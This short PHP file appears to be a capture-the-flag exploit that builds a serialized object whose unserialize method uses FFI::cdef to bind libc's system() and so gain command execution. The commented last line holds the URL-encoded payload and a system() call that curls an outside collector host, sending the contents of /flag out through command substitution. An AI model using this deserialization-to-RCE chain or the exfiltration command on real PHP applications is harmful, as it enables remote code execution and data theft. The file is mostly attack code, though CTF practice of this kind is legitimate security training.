<?php
final class A implements Serializable {
    protected $data = [
        'ret' => NULL,
        'func' => 'FFI::cdef',
        'arg' => 'int system(const char *command);'
    ];

    private function run () {
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }
    


    public function serialize (): string {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }

    public function __get ($key) {
        return $this->data[$key];
    }

    public function __set ($key, $value) {
        throw new \Exception('No implemented');
    }

}
$a = new A();
echo "unserialize('".serialize($a)."')";


//$a=unserialize(urldecode('C%3A1%3A%22A%22%3A88%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A8%3A%22FFI%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A26%3A%22int+system%28char+%2Acommand%29%3B%22%3B%7D%7D'));$a->ret->system('curl http://xss.buuoj.cn/index.php?do=api&id=BCQ6yB&location=`cat /flag`');